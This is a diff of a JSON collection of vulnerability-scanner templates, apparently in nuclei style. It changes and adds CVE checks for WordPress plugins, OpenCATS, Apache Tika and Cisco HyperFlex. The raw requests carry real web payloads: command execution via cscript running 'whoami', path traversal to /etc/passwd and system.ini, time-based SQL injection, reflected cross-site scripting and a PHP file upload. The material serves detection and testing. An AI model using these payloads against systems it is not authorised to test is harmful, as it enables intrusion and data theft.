@@ -6771,11 +6771,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -12309,9 +12309,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -13965,7 +13965,7 @@
     {
       "id": "CVE-2021-1499",
       "info": {
-        "name": "Cisco HyperFlex HX Data Platform - File Upload Vulnerability",
+        "name": "Cisco HyperFlex HX Data Platform - Arbitrary File Upload",
         "severity": "medium"
       },
       "requests": [
@@ -14831,7 +14831,7 @@
       "requests": [
         {
           "raw": [
-            "POST /wp-comments-post.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryIYl2Oz8ptq5OMtbU\n\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"comment\"\n\n{{randstr}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"author\"\n\n{{randstr}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"email\"\n\n{{randstr}}@email.com\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"url\"\n\n\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"checkbox\"\n\nyes\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"naam\"\n\n{{randstr}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"image\"; filename=\"{{php}}\"\nContent-Type: image/jpeg\n\n<?php echo 'CVE-2021-24236'; ?>\n\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"submit\"\n\nPost Comment\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"comment_post_ID\"\n\n{{post}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"comment_parent\"\n\n0\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU--\n",
+            "POST /wp-comments-post.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryIYl2Oz8ptq5OMtbU\n\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"comment\"\n\n{{randstr}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"author\"\n\n{{randstr}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"email\"\n\n{{randstr}}@email.com\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"url\"\n\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"checkbox\"\n\n\nyes\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"naam\"\n\n{{randstr}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"image\"; filename=\"{{php}}\"\nContent-Type: image/jpeg\n\n<?php echo 'CVE-2021-24236'; ?>\n\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"submit\"\n\nPost Comment\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"comment_post_ID\"\n\n{{post}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"comment_parent\"\n\n0\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU--\n",
             "GET /wp-content/plugins/imagements/images/{{php}} HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
@@ -19094,6 +19094,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0147",
+      "info": {
+        "name": "Cookie Information < 2.0.8 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/admin.php?page=wp-gdpr-compliance&x=%27+onanimationstart%3Dalert%28document.domain%29+style%3Danimation-name%3Arotation+x  HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0148",
       "info": {
         "name": "WordPress All-in-one Floating Contact Form <2.0.4 - Cross-Site Scripting",
@@ -19823,6 +19838,20 @@
       ]
     },
     {
+      "id": "CVE-2022-1057",
+      "info": {
+        "name": "Pricing Deals for WooCommerce < 2.0.3 - Unauthenticated SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 15s\nGET /wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+- HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-1119",
       "info": {
         "name": "WordPress Simple File List <3.2.8 - Local File Inclusion",
@@ -19946,7 +19975,7 @@
     {
       "id": "CVE-2022-1574",
       "info": {
-        "name": "HTML2WP <= 1.0.0 - Unauthenticated Arbitrary File Upload",
+        "name": "WordPress HTML2WP <=1.0.0 - Arbitrary File Upload",
         "severity": "critical"
       },
       "requests": [
@@ -22459,6 +22488,81 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-43014",
+      "info": {
+        "name": "OpenCATS v0.9.6 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /index.php?m=login&a=attemptLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "GET /ajax.php?f=getPipelineJobOrder&joborderID=1)\"></a>%20<script>alert(document.domain)</script>&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-43015",
+      "info": {
+        "name": "OpenCATS v0.9.6 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /index.php?m=login&a=attemptLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "GET /ajax.php?f=getPipelineJobOrder&joborderID=2&page=0&entriesPerPage=15)\"></a>%20<script>alert(document.domain)</script>&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-43016",
+      "info": {
+        "name": "OpenCATS v0.9.6 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /index.php?m=login&a=attemptLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "GET /index.php?m=toolbar&callback=<script>alert(document.domain)</script>&a=authenticate HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-43017",
+      "info": {
+        "name": "OpenCATS v0.9.6 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /index.php?m=login&a=attemptLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "GET /ajax.php?f=getPipelineJobOrder&joborderID=1&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=15)\"></a><script>alert(document.domain)</script>&isPopup=0 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-43018",
+      "info": {
+        "name": "OpenCATS v0.9.6 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /index.php?m=login&a=attemptLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script> HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
